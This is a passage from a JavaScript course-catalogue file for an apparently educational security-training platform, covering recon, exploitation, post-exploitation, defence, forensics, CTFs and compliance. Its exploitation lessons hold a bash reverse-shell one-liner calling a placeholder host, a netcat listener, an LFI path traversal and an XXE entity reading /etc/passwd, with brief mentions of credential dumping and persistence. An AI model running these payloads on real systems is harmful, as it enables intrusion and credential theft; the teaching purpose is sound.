            S("The staple", "nmap maps hosts, ports, services and versions.", ["nmap -sV -sC target finds services + defaults", "Scripts: --script=vuln hunts known vulnerabilities", "Stealth (-sS), timing, and host discovery tune the scan"]),
          ]),
        ],
      },
      {
        id: "enum:dir",
        title: "Directory & Service Enumeration",
        icon: "📁",
        minutes: 8,
        skills: ["gobuster", "nikto"],
        chapters: [
          CH("Find the hidden paths", [
            S("Gobuster/Dirsearch", "Wordlist brute-forcing finds admin panels, backups, and hidden endpoints.", ["Common lists: /admin, /api, /backup.zip, /.git", "APIs get the same treatment: /v2, /internal, /debug", "Combined with nikto's fingerprint checks it's thorough"]),
          ]),
        ],
      },
    ],
  },
  {
    id: "exploitation",
    title: "Exploitation",
    emoji: "💥",
    level: 3,
    tagline: "Reverse shells, file upload, LFI/RFI, XXE and SSRF.",
    description: "Turn findings into access: gain shells, upload webshells, read files through LFI, and abuse XXE/SSRF to pivot deeper.",
    courses: [
      {
        id: "exploit:shells",
        title: "Reverse & Bind Shells",
        icon: "🐚",
        minutes: 8,
        skills: ["shells"],
        chapters: [
          CH("Getting a shell", [
            S("Reverse shell", "The target connects back to you — the classic way out of command injection.", ["bash -i >& /dev/tcp/YOU/4444 0>&1", "You listen with nc -lvnp 4444", "Bind shells: the target listens, you connect"]),
          ]),
        ],
      },
      {
        id: "exploit:files",
        title: "File Upload, LFI & RFI",
        icon: "📄",
        minutes: 9,
        skills: ["file-upload", "lfi", "rfi"],
        chapters: [
          CH("Files as weapons", [
            S("Upload", "Unrestricted upload lets you plant a webshell that executes commands.", ["The upload lab is exactly this", "Fix: extension allow-list, content sniffing, store outside webroot"]),
            S("LFI/RFI", "Include a local or remote file through a parameter.", ["../../../../etc/passwd reads system files", "RFI fetches your own payload from the internet", "Fix: never derive include paths from user input"]),
          ]),
        ],
      },
      {
        id: "exploit:xxe",
        title: "XXE",
        icon: "🧾",
        minutes: 7,
        skills: ["xxe"],
        chapters: [
          CH("XML entity injection", [
            S("Entities that read files", "Vulnerable XML parsers resolve external entities to local files or network hosts.", ["<!ENTITY xxe SYSTEM \"file:///etc/passwd\">", "Blind XXE can exfiltrate over out-of-band DNS", "Fix: disable external entities, prefer JSON"]),
          ]),
        ],
      },
    ],
  },
  {
    id: "post-exploitation",
    title: "Post Exploitation",
    emoji: "🪜",
    level: 4,
    tagline: "Privilege escalation, persistence, credential dumping and pivoting.",
    description: "You're in. Now what? Escalate, persist, harvest credentials, and move laterally across the network.",
    courses: [
      {
        id: "post:privesc",
        title: "Privilege Escalation",
        icon: "🪜",
        minutes: 9,
        skills: ["privesc"],
        chapters: [
          CH("Root or bust", [
            S("Linux", "SUID binaries, writable cron scripts, sudo misconfigs, kernel exploits.", ["sudo -l reveals the shortcuts", "A writable PATH or script becomes root", "Automate with LinPEAS, but understand each finding"]),
            S("Windows", "Unquoted service paths, weak permissions, token tricks, juicy services.", ["PrintSpoofer/Potato chains for service accounts", "SeImpersonate → SYSTEM is a classic"]),
          ]),
        ],
      },
      {
        id: "post:pivot",
        title: "Credential Dumping & Lateral Movement",
        icon: "🕸️",
        minutes: 8,
        skills: ["lateral"],
        chapters: [
          CH("Spread quietly", [
            S("Dump & reuse", "Harvest credentials from memory, configs and history, then hop systems.", ["Mimikatz on Windows, /etc/shadow + bash_history on Linux", "Same password everywhere = one dump, whole network", "Fix: MFA, unique creds, tiered admin"]),
            S("Persistence", "Backdoors that survive reboots: cron, services, autorun keys.", ["The blue team's hardest problem", "Fix: EDR, integrity monitoring, log review"]),
          ]),
        ],
      },
    ],
  },
  {
    id: "secure-coding",
    title: "Secure Coding",
    emoji: "🛠️",
    level: 3,
    tagline: "Input validation, output encoding, hashing, sessions and tokens.",
    description: "The other side of the coin: write code that survives attackers. This path is the developer's defence playbook for every bug in the Top 10.",
    courses: [
      {
        id: "coding:input",
        title: "Input Validation & Output Encoding",
        icon: "🧼",
        minutes: 8,
        skills: ["input-validation", "output-encoding"],
        chapters: [
          CH("Validate, then encode", [
            S("The two rules", "Validate what comes in; encode what goes out.", ["Allow-list validation, not block-lists", "Context matters: HTML-encode in HTML, SQL-encode in SQL, URL-encode in URLs", "Prepared statements are the SQL answer; escaping is not"]),
          ]),
        ],
      },
      {
        id: "coding:data",
        title: "Password Hashing & Secure Sessions",
        icon: "🧂",
        minutes: 8,
        skills: ["hashing"],
        chapters: [
          CH("Store secrets right", [
            S("Hashing", "Never store passwords reversible or unsalted.", ["bcrypt/argon2 with a per-user salt", "Slow by design — that's the point", "Same for tokens and secrets: hash at rest"]),
            S("Sessions", "Secure cookies: HttpOnly, Secure, SameSite; regenerate ids on login.", ["These three attributes stop most cookie attacks", "Server-side sessions over forgeable tokens"]),
          ]),
        ],
      },
      {
        id: "coding:defences",
        title: "File Upload & CSRF Tokens",
        icon: "🛡️",
        minutes: 7,
        skills: ["secure-upload", "csrf-tokens"],
        chapters: [
          CH("Two classic hardening wins", [
            S("Uploads", "Extension allow-list, magic-byte check, store outside webroot, serve as attachment.", ["An uploaded .php/.aspx in the webroot is a webshell", "Rewrite filenames, never trust the client"]),
            S("CSRF", "Per-session tokens on every state-changing request + SameSite cookies.", ["Tokens must be unpredictable and verified server-side", "Double-submit cookie is the lightweight alternative"]),
          ]),
        ],
      },
    ],
  },
  {
    id: "blue-team",
    title: "Blue Team",
    emoji: "🛡️",
    level: 4,
    tagline: "SIEM, incident response, threat hunting and detection rules.",
    description: "Defence is a discipline: detect the intrusion, respond, hunt for the attacker already inside, and build rules to stop the next one.",
    courses: [
      {
        id: "blue:siem",
        title: "SIEM & Log Analysis",
        icon: "📊",
        minutes: 8,
        skills: ["siem"],
        chapters: [
          CH("Make logs useful", [
            S("Centralised visibility", "SIEMs (Splunk, ELK, Sentinel) collect logs and alert on patterns.", ["Correlate: login + download spike = suspicious", "Normalise timestamps and schemas everywhere", "An alert nobody reviews is decoration"]),
          ]),
        ],
      },
      {
        id: "blue:ir",
        title: "Incident Response",
        icon: "🚨",
        minutes: 9,
        skills: ["incident-response"],
        chapters: [
          CH("The IR lifecycle", [
            S("NIST framework", "Preparation → Detection → Containment → Eradication → Recovery → Lessons.", ["Preserve evidence before touching systems", "Containment buys time; eradication removes the foothold", "Post-incident review feeds better detection"]),
          ]),
        ],
      },
      {
        id: "blue:detection",
        title: "Threat Hunting & Detection Rules",
        icon: "🎣",
        minutes: 8,
        skills: ["threat-hunting"],
        chapters: [
          CH("Assume breach", [
            S("Hunt the quiet signs", "Beaconing, unusual hours, lateral movement, encoded PowerShell.", ["Query: same user, many hosts, short window", "Sigma/YARA rules turn knowledge into detection", "Logging failures (OWASP A09) make all this blind"]),
          ]),
        ],
      },
    ],
  },
  {
    id: "red-team",
    title: "Red Team",
    emoji: "🔴",
    level: 5,
    tagline: "Adversary simulation and full attack chains.",
    description: "Think like the adversary, act like the adversary: emulate real threat actors with full attack chains from initial access to goal, with evasion and reporting.",
    courses: [
      {
        id: "red:emulation",
        title: "Adversary Simulation",
        icon: "🎭",
        minutes: 8,
        skills: ["adversary-sim"],
        chapters: [
          CH("Model the enemy", [
            S("Frameworks", "MITRE ATT&CK maps adversary tactics and techniques — the shared language.", ["Initial Access → Execution → Persistence → ...", "Our attack chains are mini-T&ck tables", "Purple teams run red and blue together"]),
          ]),
        ],
      },
      {
        id: "red:chains",
        title: "Attack Chains & Evasion",
        icon: "⛓️",
        minutes: 9,
        skills: ["chains"],
        chapters: [
          CH("Chaining techniques", [
            S("From foothold to goal", "A chain combines bugs the way our playgrounds do — one exploit unlocks the next.", ["School portal: staff creds → DB → fee tampering", "Evasion: encoding, living-off-the-land, slow-and-low", "Report everything — red teaming is a test, not a crime"]),
          ]),
        ],
      },
    ],
  },
  {
    id: "forensics",
    title: "Digital Forensics",
    emoji: "🧪",
    level: 5,
    tagline: "Memory, disk, timelines and OS forensics.",
    description: "After the incident, the evidence. Recover what happened from memory, disks and timelines — the science behind incident response.",
    courses: [
      {
        id: "for:memory",
        title: "Memory & Disk Analysis",
        icon: "🧠",
        minutes: 8,
        skills: ["memory-analysis"],
        chapters: [
          CH("Read the machine", [
            S("Memory", "Volatility carves processes, network connections, and secrets out of a RAM dump.", ["Dump first — the machine won't wait", "Look for injected code and unlinked processes", "Mimikatz leaves traces in memory"]),
            S("Disk", "Recover deleted files, parse artifacts, check timestamps.", ["Autopsy/TSK for images", "Logs + prefetch + event IDs tell the story"]),
          ]),
        ],
      },
      {
        id: "for:timeline",
        title: "Timeline & OS Analysis",
        icon: "⏳",
        minutes: 7,
        skills: ["timeline"],
        chapters: [
          CH("Tell the story", [
            S("Timelines", "Sort events across the whole system to reconstruct the attack step by step.", ["SuperTimeline from $MFT, logs, browsers", "Entry point, persistence, exfiltration — in order", "Every artefact has a timestamp that can't lie"]),
          ]),
        ],
      },
    ],
  },
  {
    id: "ctf",
    title: "Capture The Flag",
    emoji: "🏁",
    level: 3,
    tagline: "Web, crypto, OSINT, stego, reversing — the hunter's gym.",
    description: "CTF categories are the fitness drills of security: web exploitation, cryptography, reverse engineering, OSINT and steganography under time pressure.",
    courses: [
      {
        id: "ctf:web",
        title: "CTF Web Exploitation",
        icon: "🕸️",
        minutes: 8,
        skills: ["ctf-web"],
        chapters: [
          CH("Solve the web", [
            S("Where the flags hide", "Cookies, source comments, headers, robots.txt, and the bugs from every path above.", ["Inspect the source and response headers first", "Tamper cookies, change ids, try the payloads you know", "Our playground flags are mini-CTF practice"]),
          ]),
        ],
      },
      {
        id: "ctf:crypto-osint",
        title: "Crypto, OSINT & Stego",
        icon: "🔢",
        minutes: 9,
        skills: ["crypto"],
        chapters: [
          CH("The other categories", [
            S("Crypto", "Base64, XOR, Caesar, hashes — the low-hanging CTF fruit.", ["CyberChef decodes almost anything", "Recognise formats: ==== is base64, 0x is hex"]),
            S("OSINT & stego", "Photos, EXIF, hidden files inside images, and social media breadcrumbs.", ["binwalk unearths embedded files", "strings + EXIF + tweaking brightness find messages"]),
          ]),
        ],
      },
    ],
  },
  {
    id: "sdlc-compliance",
    title: "Secure SDLC & Compliance",
    emoji: "📋",
    level: 3,
    tagline: "Build security into every phase — and meet HIPAA, PCI-DSS, GDPR.",
    description: "Security isn't a feature, it's a process. Learn the secure software development lifecycle and the compliance frameworks that make it mandatory — HIPAA, PCI-DSS, GDPR, SOC 2 and ISO 27001.",
    featured: true,
    courses: [
      {
        id: "sdlc:phases",
        title: "The Secure SDLC",
        icon: "🔄",
        minutes: 10,
        skills: ["sdlc"],
        chapters: [
          CH("Security in every phase", [
            S("Plan → Code → Test → Release → Operate", "Security gates sit inside each step, not at the end.", ["Plan: threat modeling + security requirements (OWASP ASVS)", "Code: secure coding standards, peer review, secrets scanning", "Test: SAST, DAST, dependency scanning, pentest", "Release: signed artifacts, supply-chain verification (SLSA)", "Operate: patching, monitoring, incident response"]),
            S("Shift left", "A flaw found at design costs pennies; the same flaw in production costs a breach.", ["Fix at the earliest phase — that's A04 Insecure Design in practice", "Our Secure Coding path gives you the controls for each gate"]),
          ]),
        ],
      },
      {
        id: "sdlc:hipaa",
        title: "HIPAA Compliance",
        icon: "🏥",
        minutes: 9,
        skills: ["hipaa"],
        chapters: [
          CH("Healthcare data rules", [
            S("What HIPAA protects", "Protected Health Information (PHI) in the US — with strict security and privacy rules.", ["Covered entities: hospitals, clinics, insurers, and their business associates", "Our CareNow clinic playground is pure PHI exposure: IDOR on patient records", "Sanctions are serious: fines per record breached"]),
            S("Security Rule pillars", "Administrative, physical, and technical safeguards.", ["Access control, audit logs, encryption, breach notification", "The clinic's IDOR fails access control AND auditing", "Fix: role-based access, audit every PHI read, encrypt at rest"]),
          ]),
        ],
      },
      {
        id: "sdlc:pcidss",
        title: "PCI-DSS",
        icon: "💳",
        minutes: 8,
        skills: ["pcidss"],
        chapters: [
          CH("Card data rules", [
            S("What PCI-DSS demands", "Anyone handling card data must follow a strict set of controls.", ["Encrypt cardholder data in transit and at rest", "Never store full PANs/CVVs; tokenize instead", "Our CyberBank playground breaks several of these at once — cookie forgery, CSRF, IDOR"]),
            S("Scope & validation", "The smaller the scope, the less you protect.", ["Segment card data environments", "Quarterly scans and annual assessments", "Fix: tokenization and card-data minimisation"]),
          ]),
        ],
      },
      {
        id: "sdlc:gdpr",
        title: "GDPR, SOC 2 & ISO 27001",
        icon: "🌍",
        minutes: 8,
        skills: ["gdpr"],
        chapters: [
          CH("The wider landscape", [
            S("GDPR", "The EU's data protection law — privacy by design, breach notification in 72 hours.", ["Data protection impact assessments (DPIAs)", "Right to erasure and data minimisation", "Personal data in the wrong hands is a breach — like IDOR'd health records"]),
            S("SOC 2 & ISO 27001", "The trust frameworks enterprises demand from vendors.", ["SOC 2: trust services criteria (security, availability, confidentiality)", "ISO 27001: an ISMS with continuous improvement", "Both reward the controls you already learned: logging, access control, patching"]),
          ]),
        ],
      },
    ],
  },
];

export function findPath(pathId) {
  return paths.find((p) => p.id === pathId);
}

export function findCourse(courseId) {
  for (const path of paths) {
    const course = path.courses.find((c) => c.id === courseId);
    if (course) return { path, course };
  }
  return null;
}

export function pathOfCourse(courseId) {
  return findCourse(courseId)?.path || null;
}

export const allCourses = paths.flatMap((p) =>
  p.courses.map((c) => ({ ...c, path: p }))
);

export const allSkills = paths.flatMap((p) =>
  p.courses.flatMap((c) =>
    (c.skills || []).map((skill) => ({ id: skill, courseId: c.id, pathId: p.id }))
  )
);
